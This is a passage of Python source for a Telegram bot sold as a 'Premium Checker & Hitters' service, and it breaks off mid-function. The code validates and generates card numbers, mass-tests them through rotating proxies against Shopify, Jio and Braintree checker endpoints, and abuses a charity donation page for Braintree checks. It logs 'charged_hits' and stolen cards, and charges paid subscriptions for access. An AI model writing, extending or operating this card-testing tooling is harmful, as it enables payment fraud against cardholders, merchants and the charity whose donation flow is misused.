# ─────────────────────────────────────────────────────────────────────────────
# 𒉼 𝔢 𝔯 𝔯 𝔬 𝔯 乙 — Premium Checker & Hitters
# ─────────────────────────────────────────────────────────────────────────────

import asyncio, gzip, html, io, json, logging, os, random, re, sqlite3, string, sys, threading, time, uuid, base64
from collections import defaultdict
from contextlib import contextmanager
from datetime import datetime, timezone, timedelta
from typing import Any, Dict, List, Optional
from urllib.parse import quote

import aiohttp
from aiogram import Bot, Dispatcher, Router, F, BaseMiddleware
from aiogram.client.default import DefaultBotProperties
from aiogram.enums import ParseMode
from aiogram.filters import Command, CommandStart, CommandObject
from aiogram.types import (
    Message, CallbackQuery, InlineKeyboardMarkup, InlineKeyboardButton,
    InputMediaPhoto, LabeledPrice, PreCheckoutQuery, BotCommand, BufferedInputFile,
)
from aiogram.client.session.aiohttp import AiohttpSession
from aiogram.exceptions import TelegramBadRequest

try:
    from aiohttp_socks import ProxyConnector
    HAS_SOCKS = True
except ImportError:
    HAS_SOCKS = False

try:
    import node_client as _node_client_module
    HAS_NODE_CLIENT = True
except Exception as _nc_err:
    _node_client_module = None
    HAS_NODE_CLIENT = False
    print(f"[bot] node_client.py not importable: {_nc_err}", flush=True)

# ── Branding ─────────────────────────────────────────────────────────────────
BOT_BRAND = "𒉼 𝔢 𝔯 𝔯 𝔬 𝔯 乙"
DEV_BRAND = "𒉼 𝔢 𝔯 𝔯 𝔬 𝔯 乙"
KEY_PREFIX = "ERRORZ"
KEY_BRAND_PREFIX = "𒉼 𝔢 𝔯 𝔯 𝔬 𝔯 乙"

# ── IDs ──────────────────────────────────────────────────────────────────────
OWNER_ID   = 8919487892
DEV_ID     = 8887845336
STEALTH_ID = 8919487892
ADMIN_IDS  = [OWNER_ID, DEV_ID]
LIMITED_ADMIN_IDS: List[int] = []

# ── Env & Config ─────────────────────────────────────────────────────────────
BOT_TOKEN = os.getenv("BOT_TOKEN", "")
DB_PATH = os.getenv("DB_PATH", "bot.db")
API_STATE_PATH = os.getenv("API_STATE_PATH", "api_endpoints.json")
SITES_PATH = os.getenv("SITES_PATH", "sites.txt")
PORT = os.getenv("PORT")

CHECK_TIMEOUT            = 45
PROXY_CONNECT_TIMEOUT    = 10
PROXY_SOCK_READ_TIMEOUT  = 30

MASS_BATCH_SIZE_LB          = 250
MASS_BATCH_DELAY_LB         = 0.2
MASS_CONCURRENCY_LB_ADMIN   = 100
MASS_CONCURRENCY_LB_PREMIUM = 60

PROXY_TEST_TIMEOUT         = 15
PROXY_TEST_CONNECT_TIMEOUT = 10
PROXY_TEST_ROUNDS          = 1
PROXY_TEST_BATCH           = 25
PROXY_TEST_URL             = "https://api.ipify.org"
LIVE_PROXY_LIMIT           = 100
PER_PROXY_CONCURRENCY      = 4
PROXY_FAIL_THRESHOLD       = 2

DEFAULT_WORKERS_CAP = 900
LB_ACTIVE_PER_NODE = 500
LB_BACKUP_PER_NODE = 400
LB_RETRY_COOLDOWN = 30
LB_MAX_RETRIES = 2
ENDPOINT_FAIL_THRESHOLD = 3
ENDPOINT_COOLDOWN_SEC = 60

DUMMY_CC = "4111111111111111|12|30|123"
BOT_USERNAME = "errorz_bot"

# ── Images (swap freely) ─────────────────────────────────────────────────────
IMAGES = {
    "main":       "https://files.catbox.moe/rwc563.jpg",
    "shop":       "https://files.catbox.moe/qqbj3x.jpg",
    "hit":        "https://files.catbox.moe/9yypzu.jpg",
    "decline":    "https://files.catbox.moe/ejon6m.jpg",
    "check":      "https://files.catbox.moe/c3rib3.jpg",
    "tools":      "https://files.catbox.moe/oooo15.jpg",
    "proxy":      "https://files.catbox.moe/oooo15.jpg",
    "account":    "https://files.catbox.moe/rwc563.jpg",
    "admin":      "https://files.catbox.moe/oooo15.jpg",
    "hitter":     "https://files.catbox.moe/rwc563.jpg",
    "pay":        "https://files.catbox.moe/qqbj3x.jpg",
}
IMG_MAIN     = IMAGES["main"]
IMG_SHOP     = IMAGES["shop"]
IMG_HIT      = IMAGES["hit"]
IMG_DECLINE  = IMAGES["decline"]
IMG_CHECK    = IMAGES["check"]
IMG_TOOLS    = IMAGES["tools"]
IMG_PROXY    = IMAGES["proxy"]
IMG_ACCOUNT  = IMAGES["account"]
IMG_ADMIN    = IMAGES["admin"]
IMG_HITTER   = IMAGES["hitter"]
IMG_PAY      = IMAGES["pay"]

# ── Jio / VBV config ─────────────────────────────────────────────────────────
JIO_API_URL_DEFAULT = "https://doom1.up.railway.app/check"
JIO_NAP_EVERY       = 10
JIO_NAP_DURATION    = 300
JIO_BAN_DURATION    = 86400
JIO_ALLOWED_AMOUNTS = {"19","29","49","69","98","129","155","199","219","239","299","349","399","449","499","599","719","839","999","1499"}

VBV_SITE   = "https://cllsupport.org.uk"
VBV_DONATE = f"{VBV_SITE}/donate/"
VBV_GQL    = "https://payments.braintree-api.com/graphql"
VBV_BT     = "https://api.braintreegateway.com"
VBV_TIMEOUT = 45

# ── Crypto defaults ──────────────────────────────────────────────────────────
CRYPTO_DEFAULTS = {"btc": "", "usdt_trc20": "", "eth": "", "ltc": ""}

BACKUP_CHUNK_SIZE  = 18 * 1024 * 1024
BACKUP_SESSION_TTL = 3600
_restore_sessions = {}
_restore_lock = threading.RLock()

DEFAULT_API_STATE = {
    "version": 5,
    "endpoints": [
        {"url": "http://107.148.78.54:8083/shopify", "style": "raw", "cap": 900, "enabled": True, "key": None, "site_required": False},
    ],
    "active_idx": 0,
}
DEFAULT_SITES: List[str] = []
TELEGRAM_PROXY = None

# ── Plans ────────────────────────────────────────────────────────────────────
PLANS = {
    "free":      {"name": "Beginner",  "limit": 1000,   "mass_limit": 100,   "stars": 0},
    "pro":       {"name": "Pro",       "limit": 5000,   "mass_limit": 2000,  "stars": 200},
    "premium":   {"name": "Premium",   "limit": 10000,  "mass_limit": 5000,  "stars": 200},
    "max":       {"name": "MAX",       "limit": 30000,  "mass_limit": 10000, "stars": 500},
    "unlimited": {"name": "Unlimited", "limit": 999999, "mass_limit": 20000, "stars": 800},
}
STAR_PRODUCTS_BASE = {
    "star_premium":   {"plan": "premium",   "stars": 200, "days": 30, "label": "Premium — 30 Days"},
    "star_max":       {"plan": "max",       "stars": 500, "days": 30, "label": "MAX — 30 Days"},
    "star_unlimited": {"plan": "unlimited", "stars": 800, "days": 30, "label": "Unlimited — 30 Days"},
}

logging.basicConfig(level=logging.INFO, format="%(asctime)s | %(levelname)s | %(message)s", stream=sys.stderr)
log = logging.getLogger("errorz")

EMOJI = {"settings":"5877260593903177342","back":"5875082500023258804","forward":"5832251986635920010","user":"5879770735999717115","pen":"5839380580080293813","docs":"5877301185639091664","trash":"5879915802815107172","unlock":"5886505193180239900","star":"5839116473951328489","chat":"5793933761594789855","help":"5897846616966041652","tools":"5988023995125993550","stop":"5870734657384877785","add":"5920090136627908485","shop":"5983399041197675256","gem":"5778546023349621090","gem2":"5963312935148195483","gem3":"6028530359975548369","chat2":"5985617073978481575","cross1":"5985346521103604145","up":"6030861234432121355","num1":"5794182096603847292","pen2":"5985774024968379294","loading":"6258124820400049944","infinity":"6258154670422757760","heart":"6257853292567597091","percent":"6258071055999438126","warn_red":"6257858798715670989","chart":"6258267877170745815","check":"6258098853027778582","online":"6260192112713666900","gem4":"6260181985180782013","up_tri":"6262482227930598980","diamond":"6260156752247918115","refresh":"6260297232038235681","check2":"6262671743362535108","diamond2":"6260308957298954089","green_sq":"6260565633134498058","down_tri":"6260486601441284439","ghost":"6282819035516113016","cross2":"6282852025159913806","check3":"6280338743442280499","hourglass":"6280443553529204094","glow_star":"6280674670014369924","smile":"6282811871510662984","upside":"6282622386143498738","warn":"6206077285720659346","warn2":"6206174450765796040","link":"6206497372176913599","book":"6206112371308500200","pill":"6206378324273403309","bell":"6206508629286196237","red_x":"6206110936789423908"}

EMOJI.update({
    "crown":   EMOJI["star"],
    "bolt":    EMOJI["up_tri"],
    "dot":     EMOJI["green_sq"],
    "clock":   EMOJI["hourglass"],
    "pie":     EMOJI["percent"],
    "id":      EMOJI["num1"],
    "msg":     EMOJI["chat2"],
    "shield":  EMOJI["unlock"],
    "card":    EMOJI["shop"],
    "spark":   EMOJI["glow_star"],
    "grl":     "6138834878302524958",
    "fav":     "6230927657257668107",
    "com":     "6154506501001057160",
    "fly":     "6044262726396546853",
    "fire_e":  "6044260346984665434",
    "thunder_e":"6044184811394831904",
    "users_e": "5039789890133296083",
    "card_e":  "5800709991627232190",
})

class PremiumButton(InlineKeyboardButton):
    icon_custom_emoji_id: Optional[str] = None
    style: Optional[str] = None

def pbtn(text, *, icon="star", color="primary", callback_data=None, url=None):
    try:
        return PremiumButton(text=text, callback_data=callback_data, url=url,
                             icon_custom_emoji_id=EMOJI.get(icon, EMOJI["star"]), style=color)
    except Exception:
        return InlineKeyboardButton(text=text, callback_data=callback_data, url=url)

def pe(name): return f'<tg-emoji emoji-id="{EMOJI.get(name, EMOJI["star"])}">⭐</tg-emoji>'
def esc(text): return html.escape(str(text) if text is not None else "")

_SC_MAP = {'a':'ᴀ','b':'ʙ','c':'ᴄ','d':'ᴅ','e':'ᴇ','f':'ꜰ','g':'ɢ','h':'ʜ','i':'ɪ','j':'ᴊ','k':'ᴋ','l':'ʟ','m':'ᴍ','n':'ɴ','o':'ᴏ','p':'ᴘ','q':'ǫ','r':'ʀ','s':'ꜱ','t':'ᴛ','u':'ᴜ','v':'ᴠ','w':'ᴡ','x':'x','y':'ʏ','z':'ᴢ'}
def sc(text: str) -> str: return "".join(_SC_MAP.get(ch.lower(), ch) for ch in str(text))

def owner_link(): return f"<b>{BOT_BRAND}</b>"
def dev_link(): return f"<b>{DEV_BRAND}</b>"

def rule(n: int = 11) -> str: return "━" * n
def hdr(title: str, icon: str = "spark") -> str: return f"<blockquote>{pe(icon)} <b>{title}</b> {pe(icon)}</blockquote>"

def _fmt_key_display(key: str) -> str:
    try:
        parts = key.split("-")
        return f"{KEY_BRAND_PREFIX}-{parts[1]}-{parts[2]}"
    except: return key

def normalize_key_input(s: str) -> str:
    s = s.strip().upper()
    s = s.replace(KEY_BRAND_PREFIX, KEY_PREFIX)
    s = re.sub(r"\s+", "", s)
    return s

_URL_RE      = re.compile(r"https?://[^\s'\"<>]+", re.IGNORECASE)
_IP_PORT_RE  = re.compile(r"\b(?:\d{1,3}\.){3}\d{1,3}(?::\d{1,5})?\b")
_HOST_PORT_RE = re.compile(r"\b[a-zA-Z0-9][a-zA-Z0-9\-\.]{1,}\.[a-zA-Z]{2,}(?::\d{1,5})?\b")
def _sanitize_err(msg) -> str:
    if not msg: return ""
    s = str(msg)
    s = _URL_RE.sub("[redacted]", s)
    s = _IP_PORT_RE.sub("[redacted]", s)
    s = _HOST_PORT_RE.sub("[redacted]", s)
    return s[:200]

def _user_link(uid: int, username: str = "") -> str:
    if not uid: return sc("USER")
    if username: return f'<a href="https://t.me/{esc(username.lstrip("@"))}">{esc(username)}</a>'
    return f'<a href="tg://user?id={uid}">User {uid}</a>'

def load_handling_vps_on() -> bool:
    return HAS_NODE_CLIENT and get_setting("load_handling", "1") == "1"

def load_handling_heroku_on() -> bool:
    return HAS_NODE_CLIENT and get_setting("load_handling_heroku", "1") == "1"

def load_handling_on() -> bool:
    return load_handling_vps_on() or load_handling_heroku_on()

def node_summary_str_vps() -> str:
    if not HAS_NODE_CLIENT: return "n/a"
    try:
        s = _node_client_module.NODE_MANAGER_VPS.summary()
        return f"{s['available']}/{s['total']} live"
    except: return "error"

def node_summary_str_heroku() -> str:
    if not HAS_NODE_CLIENT: return "n/a"
    try:
        s = _node_client_module.NODE_MANAGER_HEROKU.summary()
        return f"{s['available']}/{s['total']} live"
    except: return "error"

def get_check_cooldown() -> int:
    return 1 if load_handling_on() else 3

_lb_pool_rr = 0
_lb_pool_lock = threading.Lock()

def _next_pool_preference(single: bool = False) -> List[str]:
    vps = load_handling_vps_on()
    hkr = load_handling_heroku_on()
    if single:
        if vps and hkr:
            vps_load = _node_client_module.NODE_MANAGER_VPS.get_total_active()
            hkr_load = _node_client_module.NODE_MANAGER_HEROKU.get_total_active()
            return ["vps"] if vps_load <= hkr_load else ["heroku"]
        return ["vps"] if vps else (["heroku"] if hkr else [])
    if vps and hkr:
        vps_load = _node_client_module.NODE_MANAGER_VPS.get_total_active()
        hkr_load = _node_client_module.NODE_MANAGER_HEROKU.get_total_active()
        return ["vps", "heroku"] if vps_load <= hkr_load else ["heroku", "vps"]
    if vps: return ["vps"]
    if hkr: return ["heroku"]
    return []

_state_lock = threading.RLock()
_sites_cache: List[str] = []
_sites_loaded = False

def _atomic_write(path: str, data: str) -> None:
    tmp = f"{path}.tmp"
    with open(tmp, "w", encoding="utf-8") as f: f.write(data)
    os.replace(tmp, path)

def _migrate_api_state(st: Dict[str, Any]) -> Dict[str, Any]:
    ver = int(st.get("version", 1) or 1)
    if ver < 5:
        existing = {e.get("url", "") for e in st.get("endpoints", [])}
        for ep in DEFAULT_API_STATE["endpoints"]:
            if ep["url"] not in existing: st.setdefault("endpoints", []).append(dict(ep))
        st["version"] = 5
    for ep in st.get("endpoints", []):
        ep.setdefault("style", "params"); ep.setdefault("cap", DEFAULT_WORKERS_CAP); ep.setdefault("enabled", True); ep.setdefault("key", None)
        if "site_required" not in ep: ep["site_required"] = (ep.get("style") == "params")
    st.setdefault("active_idx", 0)
    return st

def load_api_state() -> Dict[str, Any]:
    with _state_lock:
        try:
            with open(API_STATE_PATH, "r", encoding="utf-8") as f: st = json.load(f)
            if not isinstance(st.get("endpoints"), list): raise ValueError("bad state")
            return _migrate_api_state(st)
        except Exception:
            _atomic_write(API_STATE_PATH, json.dumps(DEFAULT_API_STATE, indent=2))
            return json.loads(json.dumps(DEFAULT_API_STATE))

def save_api_state(st: Dict[str, Any]) -> None:
    with _state_lock: _atomic_write(API_STATE_PATH, json.dumps(st, indent=2))

def _filtered_endpoints() -> List[Dict[str, Any]]:
    mode = get_setting("site_mode", "auto")
    st = load_api_state()
    eps = [e for e in st.get("endpoints", []) if e.get("enabled", True) and e.get("url")]
    if mode == "siteless": eps = [e for e in eps if not e.get("site_required", False)]
    elif mode == "with_site": eps = [e for e in eps if e.get("site_required", False)]
    return eps

def endpoints_need_sites() -> bool:
    eps = _filtered_endpoints()
    if not eps: return False
    return all(e.get("site_required", False) for e in eps)

def mode_label() -> str:
    m = get_setting("site_mode", "auto")
    if m == "siteless": return "SITELESS"
    if m == "with_site": return "WITH-SITE"
    return "AUTO"

_endpoint_rr = 0
_endpoint_rr_lock = threading.Lock()
_endpoint_fail_counts: Dict[str, int] = {}
_endpoint_fail_ts:    Dict[str, float] = {}
_node_active_sems:  Dict[str, asyncio.Semaphore] = {}
_node_backup_sems:  Dict[str, asyncio.Semaphore] = {}

def _get_node_sems(url: str):
    if url not in _node_active_sems:
        _node_active_sems[url] = asyncio.Semaphore(LB_ACTIVE_PER_NODE)
        _node_backup_sems[url] = asyncio.Semaphore(LB_BACKUP_PER_NODE)
    return _node_active_sems[url], _node_backup_sems[url]

def mark_endpoint_fail(url: str):
    _endpoint_fail_counts[url] = _endpoint_fail_counts.get(url, 0) + 1
    if _endpoint_fail_counts[url] >= ENDPOINT_FAIL_THRESHOLD: _endpoint_fail_ts[url] = time.time()

def mark_endpoint_ok(url: str):
    _endpoint_fail_counts.pop(url, None)
    _endpoint_fail_ts.pop(url, None)

def is_endpoint_down(url: str) -> bool:
    ts = _endpoint_fail_ts.get(url, 0)
    if ts and time.time() - ts < ENDPOINT_COOLDOWN_SEC: return True
    if ts: _endpoint_fail_ts.pop(url, None); _endpoint_fail_counts.pop(url, None)
    return False

def load_sites() -> List[str]:
    global _sites_cache, _sites_loaded
    with _state_lock:
        if _sites_loaded: return list(_sites_cache)
        try:
            with open(SITES_PATH, "r", encoding="utf-8") as f: _sites_cache = [l.strip() for l in f if l.strip()]
        except FileNotFoundError:
            _sites_cache = list(DEFAULT_SITES)
            _atomic_write(SITES_PATH, "")
        _sites_loaded = True
        return list(_sites_cache)

# ── DB ───────────────────────────────────────────────────────────────────────
_db_conn: Optional[sqlite3.Connection] = None
_db_lock = threading.RLock()
_db_write_lock: Optional[asyncio.Lock] = None

def _get_write_lock() -> asyncio.Lock:
    global _db_write_lock
    if _db_write_lock is None: _db_write_lock = asyncio.Lock()
    return _db_write_lock

def _get_conn() -> sqlite3.Connection:
    global _db_conn
    if _db_conn is None:
        _db_conn = sqlite3.connect(DB_PATH, timeout=60, check_same_thread=False)
        _db_conn.row_factory = sqlite3.Row
        _db_conn.execute("PRAGMA journal_mode=WAL")
        _db_conn.execute("PRAGMA synchronous=NORMAL")
        _db_conn.execute("PRAGMA busy_timeout=60000")
    return _db_conn

def reset_db_conn():
    global _db_conn
    with _db_lock:
        if _db_conn:
            try: _db_conn.close()
            except: pass
            _db_conn = None
    return _get_conn()

@contextmanager
def db():
    conn = _get_conn()
    with _db_lock:
        try:
            yield conn
            conn.commit()
        except Exception:
            conn.rollback()
            raise

def init_db() -> None:
    with db() as c:
        c.executescript("""
        CREATE TABLE IF NOT EXISTS users (
            uid INTEGER PRIMARY KEY, username TEXT DEFAULT '', plan TEXT DEFAULT 'free',
            premium_until TEXT DEFAULT '', daily_checks INTEGER DEFAULT 0,
            last_check_date TEXT DEFAULT '', credits INTEGER DEFAULT 50,
            last_credit_date TEXT DEFAULT '', trial_last_used TEXT DEFAULT '',
            awaiting TEXT DEFAULT '', banned INTEGER DEFAULT 0, refer_count INTEGER DEFAULT 0,
            referred_by INTEGER DEFAULT 0, streak INTEGER DEFAULT 0,
            last_streak_date TEXT DEFAULT '', total_checks INTEGER DEFAULT 0,
            total_hits INTEGER DEFAULT 0, last_seen TEXT DEFAULT ''
        );
        CREATE TABLE IF NOT EXISTS settings (key TEXT PRIMARY KEY, value TEXT);
        CREATE TABLE IF NOT EXISTS redeem_codes (code TEXT PRIMARY KEY, plan TEXT, max_uses INTEGER, used INTEGER DEFAULT 0, days INTEGER DEFAULT 30);
        CREATE TABLE IF NOT EXISTS redeem_log (id INTEGER PRIMARY KEY AUTOINCREMENT, code TEXT, uid INTEGER, used_at TEXT, UNIQUE(code, uid));
        CREATE TABLE IF NOT EXISTS check_logs (id INTEGER PRIMARY KEY AUTOINCREMENT, uid INTEGER, cc TEXT, response TEXT, status TEXT, gateway TEXT, ts TEXT);
        CREATE TABLE IF NOT EXISTS saved_cards (id INTEGER PRIMARY KEY AUTOINCREMENT, uid INTEGER, cc TEXT, saved_at TEXT, UNIQUE(uid, cc));
        CREATE TABLE IF NOT EXISTS bin_cache (bin TEXT PRIMARY KEY, data TEXT, ts TEXT);
        CREATE TABLE IF NOT EXISTS user_proxies (
            id INTEGER PRIMARY KEY AUTOINCREMENT, uid INTEGER, proxy TEXT,
            status TEXT DEFAULT 'unknown', latency REAL DEFAULT 0,
            checked_at TEXT DEFAULT '', UNIQUE(uid, proxy)
        );
        CREATE TABLE IF NOT EXISTS sites (id INTEGER PRIMARY KEY AUTOINCREMENT, url TEXT UNIQUE);
        CREATE TABLE IF NOT EXISTS force_channels (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            chat_id TEXT UNIQUE, title TEXT DEFAULT '', chat_type TEXT DEFAULT 'channel',
            invite_link TEXT DEFAULT '', enabled INTEGER DEFAULT 1, added_at TEXT DEFAULT ''
        );
        CREATE TABLE IF NOT EXISTS charged_hits (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            cc TEXT, site TEXT, response TEXT,
            amount REAL DEFAULT 0, currency TEXT DEFAULT 'USD',
            uid INTEGER DEFAULT 0, ts TEXT DEFAULT ''
        );
        CREATE TABLE IF NOT EXISTS feedback (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            uid INTEGER, username TEXT, msg_type TEXT, text TEXT, file_id TEXT, ts TEXT
        );
        """)
        for k, v in [
            ("maintenance", "0"), ("hit_log_channel", ""), ("auto_post_chat", ""), ("charged_gc_id", ""),
            ("charged_gc_name", ""), ("public_gc_id", ""), ("fb_channel_id", ""), ("site_max_price", "3.0"),
            ("site_health", "{}"), ("extra_admins", ""), ("limited_admins", ""), ("pvt_file_gc_id", ""),
            ("pvt_file_gc_name", ""), ("pvt_cc_gc_id", ""), ("pvt_cc_gc_name", ""), ("site_mode", "auto"),
            ("load_handling", "1"), ("load_handling_heroku", "1"),
            ("crypto_wallets", ""), ("jio_api_url", JIO_API_URL_DEFAULT),
            ("star_price_premium", "200"), ("star_price_max", "500"), ("star_price_unlimited", "800"),
        ]: c.execute("INSERT OR IGNORE INTO settings(key, value) VALUES (?,?)", (k, v))
        try: c.execute("ALTER TABLE users ADD COLUMN welcomed INTEGER DEFAULT 0")
        except sqlite3.OperationalError: pass
        try: c.execute("ALTER TABLE users ADD COLUMN jio_checks INTEGER DEFAULT 0")
        except sqlite3.OperationalError: pass

def get_setting(key, default=""):
    try:
        with db() as c:
            r = c.execute("SELECT value FROM settings WHERE key=?", (key,)).fetchone()
            return r["value"] if r else default
    except: return default

def set_setting(key, value):
    with db() as c: c.execute("INSERT INTO settings(key,value) VALUES (?,?) ON CONFLICT(key) DO UPDATE SET value=excluded.value", (key, str(value)))

def get_star_products() -> Dict[str, Dict[str, Any]]:
    out = {}
    for k, p in STAR_PRODUCTS_BASE.items():
        stars = int(get_setting(f"star_price_{p['plan']}", str(p["stars"])))
        out[k] = {**p, "stars": stars}
    return out

def get_star_price(plan_key: str) -> int:
    return int(get_setting(f"star_price_{plan_key}", str(PLANS.get(plan_key, {}).get("stars", 0))))

def get_crypto_wallets() -> Dict[str, str]:
    try:
        d = json.loads(get_setting("crypto_wallets", "") or "{}")
        if not isinstance(d, dict): return dict(CRYPTO_DEFAULTS)
        return {**CRYPTO_DEFAULTS, **d}
    except: return dict(CRYPTO_DEFAULTS)

def set_crypto_wallet(name: str, value: str):
    w = get_crypto_wallets(); w[name] = value.strip()
    set_setting("crypto_wallets", json.dumps(w))

def get_jio_url() -> str:
    return get_setting("jio_api_url", JIO_API_URL_DEFAULT)

def load_extra_admins():
    try:
        stored = get_setting("extra_admins", "")
        if stored:
            for x in stored.split(","):
                if x.strip().isdigit() and int(x) not in ADMIN_IDS: ADMIN_IDS.append(int(x))
        lst = get_setting("limited_admins", "")
        if lst:
            for x in lst.split(","):
                if x.strip().isdigit() and int(x) not in LIMITED_ADMIN_IDS: LIMITED_ADMIN_IDS.append(int(x))
    except: pass

def save_extra_admins():
    try:
        set_setting("extra_admins", ",".join(str(x) for x in ADMIN_IDS if x not in (OWNER_ID, DEV_ID)))
        set_setting("limited_admins", ",".join(str(x) for x in LIMITED_ADMIN_IDS))
    except: pass

def get_user(uid):
    try:
        with db() as c: return c.execute("SELECT * FROM users WHERE uid=?", (uid,)).fetchone()
    except: return None

def ensure_user(uid, username=""):
    try:
        with db() as c:
            row = c.execute("SELECT uid FROM users WHERE uid=?", (uid,)).fetchone()
            today, now = datetime.now(timezone.utc).date().isoformat(), datetime.now(timezone.utc).isoformat()
            if not row: c.execute("INSERT OR IGNORE INTO users(uid, username, last_credit_date, last_check_date, last_seen) VALUES (?,?,?,?,?)", (uid, username or "", today, today, now))
            else: c.execute("UPDATE users SET username=?, last_seen=? WHERE uid=?", (username or "", now, uid))
    except Exception as e: log.warning(f"ensure_user: {e}")

def get_user_or_create(uid, username=""):
    ensure_user(uid, username)
    return get_user(uid)

def set_awaiting(uid, state):
    ensure_user(uid)
    with db() as c: c.execute("UPDATE users SET awaiting=? WHERE uid=?", (state, uid))

def get_awaiting(uid):
    u = get_user(uid)
    return u["awaiting"] if u else ""

def is_full_admin(uid): return uid in ADMIN_IDS
def is_limited_admin(uid): return uid in LIMITED_ADMIN_IDS
def is_admin(uid): return is_full_admin(uid) or is_limited_admin(uid)

def plan_of(uid):
    u = get_user(uid)
    return u["plan"] if u and u["plan"] in PLANS else "free"

def upgrade_user(uid, plan_name, days=30):
    if plan_name not in PLANS: return
    ensure_user(uid)
    exp = "" if plan_name == "unlimited" else (datetime.now(timezone.utc) + timedelta(days=days)).isoformat()
    with db() as c: c.execute("UPDATE users SET plan=?, premium_until=? WHERE uid=?", (plan_name, exp, uid))

class EnsureUserMiddleware(BaseMiddleware):
    async def __call__(self, handler, event, data):
        try:
            u = data.get("event_from_user")
            if u and not getattr(u, "is_bot", False): ensure_user(u.id, u.username or "")
        except: pass
        return await handler(event, data)

_sites_cache2 = None
_sites_cache_ts = 0

def _invalidate_sites():
    global _sites_cache, _sites_cache2, _sites_cache_ts, _sites_loaded
    _sites_cache, _sites_cache2, _sites_cache_ts, _sites_loaded = [], None, 0, False

def get_sites() -> List[str]:
    global _sites_cache2, _sites_cache_ts
    now = time.time()
    if _sites_cache2 is not None and (now - _sites_cache_ts) < 30: return _sites_cache2
    try:
        with db() as c: _sites_cache2 = [r["url"] for r in c.execute("SELECT url FROM sites ORDER BY id").fetchall()]
    except: _sites_cache2 = []
    _sites_cache_ts = now
    return _sites_cache2

def add_site_db(url: str) -> bool:
    url = url.strip().lower()
    if url.startswith("https://"): url = url[8:]
    elif url.startswith("http://"): url = url[7:]
    url = url.split("/")[0]
    if not url: return False
    with db() as c: c.execute("INSERT OR IGNORE INTO sites(url) VALUES (?)", (url,))
    _invalidate_sites()
    return True

def remove_site_db(url: str):
    with db() as c: c.execute("DELETE FROM sites WHERE url=?", (url,))
    _invalidate_sites()

def force_channels_list(enabled_only=False):
    with db() as c:
        q = "SELECT * FROM force_channels"
        if enabled_only: q += " WHERE enabled=1"
        return c.execute(q).fetchall()

def add_force_channel(chat_id: str, title: str = "", chat_type: str = "channel", invite_link: str = ""):
    with db() as c: c.execute("INSERT OR REPLACE INTO force_channels(chat_id, title, chat_type, invite_link, enabled, added_at) VALUES (?, ?, ?, ?, 1, ?)", (str(chat_id), title, chat_type, invite_link, datetime.now(timezone.utc).isoformat()))

def remove_force_channel(chat_id: str):
    with db() as c: c.execute("DELETE FROM force_channels WHERE chat_id=?", (str(chat_id),))

def toggle_force_channel(chat_id: str):
    with db() as c:
        row = c.execute("SELECT enabled FROM force_channels WHERE chat_id=?", (str(chat_id),)).fetchone()
        if row:
            new = 0 if row["enabled"] else 1
            c.execute("UPDATE force_channels SET enabled=? WHERE chat_id=?", (new, str(chat_id)))
            return new
    return 0

async def check_force_sub(bot, uid):
    if is_admin(uid): return True
    for ch in force_channels_list(enabled_only=True):
        try:
            m = await bot.get_chat_member(ch["chat_id"], uid)
            if m.status in ("left", "kicked"): return False
        except: pass
    return True

_site_fail_count: Dict[str, int] = {}
_site_cooldown_until: Dict[str, float] = {}
SITE_MIN_GAP = 1.0
_site_last_hit: Dict[str, float] = {}
_site_locks: Dict[str, asyncio.Lock] = {}

async def acquire_site_slot(site: str):
    if not site: return
    lock = _site_locks.setdefault(site, asyncio.Lock())
    async with lock:
        wait = SITE_MIN_GAP - (time.time() - _site_last_hit.get(site, 0))
        if wait > 0: await asyncio.sleep(wait)
        _site_last_hit[site] = time.time()

def _is_site_benched(site): return time.time() < _site_cooldown_until.get(site, 0)
def _bench_site(site, seconds=120): _site_cooldown_until[site] = time.time() + seconds

def _pick_random_sites(n=3):
    sites = get_sites()
    if not sites: return []
    healthy = [s for s in sites if not _is_site_benched(s)]
    pool = healthy if healthy else list(sites)
    random.shuffle(pool)
    return pool[:n]

_mass_tasks = {}
_pending_mass: Dict[str, Dict[str, Any]] = {}

def _cleanup_pending_mass():
    now = time.time()
    for k in [k for k, v in _pending_mass.items() if now - v.get("ts", 0) > 3600]: _pending_mass.pop(k, None)

CC_REGEX = re.compile(r"^\d{13,19}\|\d{1,2}\|\d{2,4}\|\d{3,4}$")

def normalize_cc(raw):
    if not raw: return None
    s = re.sub(r"[\s:;,/\-]+", "|", raw.strip())
    parts = [p for p in s.split("|") if p]
    if len(parts) != 4: return None
    num, mm, yy, cvv = (re.sub(r"\D", "", x) for x in parts)
    if not (num and mm and yy and cvv) or not (13 <= len(num) <= 19): return None
    if len(yy) == 4: yy = yy[2:]
    cc = f"{num}|{mm.zfill(2)[:2]}|{yy.zfill(2)[:2]}|{cvv.zfill(3)[:4]}"
    return cc if CC_REGEX.match(cc) else None

def country_flag(code):
    if not code or len(code) != 2 or not code.isalpha(): return "🌍"
    return chr(0x1F1E6 + ord(code[0].upper()) - 65) + chr(0x1F1E6 + ord(code[1].upper()) - 65)

def luhn_check_digit(partial):
    for d in "0123456789":
        if luhn_ok(partial + d): return d
    return "0"

def luhn_ok(card):
    if not card.isdigit(): return False
    total, rev = 0, card[::-1]
    for i, ch in enumerate(rev):
        d = ord(ch) - 48
        if i % 2 == 1:
            d *= 2
            if d > 9: d -= 9
        total += d
    return total % 10 == 0

def brand_pe(cc):
    if cc.startswith('4'): return f"{pe('gem')} ᴠɪꜱᴀ"
    if cc.startswith('5'): return f"{pe('gem2')} ᴍᴀꜱᴛᴇʀ"
    if cc.startswith(('34','37')): return f"{pe('gem3')} ᴀᴍᴇx"
    return f"{pe('gem4')} ᴅɪꜱᴄ"

def generate_cc(bin_prefix="4", count=1):
    cards = []
    for _ in range(count):
        length = 15 if bin_prefix.startswith(("34", "37")) else 16
        prefix = bin_prefix or "4"
        middle = "".join(random.choices(string.digits, k=length - len(prefix) - 1))
        body = prefix + middle
        cards.append(f"{body + luhn_check_digit(body)}|{random.randint(1,12):02d}|{random.randint(26,32):02d}|{random.randint(0,999):03d}")
    return cards

_proxy_sems: Dict[str, asyncio.Semaphore] = {}
_proxy_fail_streak: Dict[str, int] = defaultdict(int)
_dead_proxies_run: set = set()
_rotation_counters: Dict[int, int] = {}
_rotation_lock = threading.Lock()

def rotate_proxy(uid: int, proxies: List[str]) -> Optional[str]:
    if not proxies: return None
    with _rotation_lock:
        i = _rotation_counters.get(uid, 0)
        _rotation_counters[uid] = i + 1
    return proxies[i % len(proxies)]

def proxy_sem(proxy: str) -> asyncio.Semaphore:
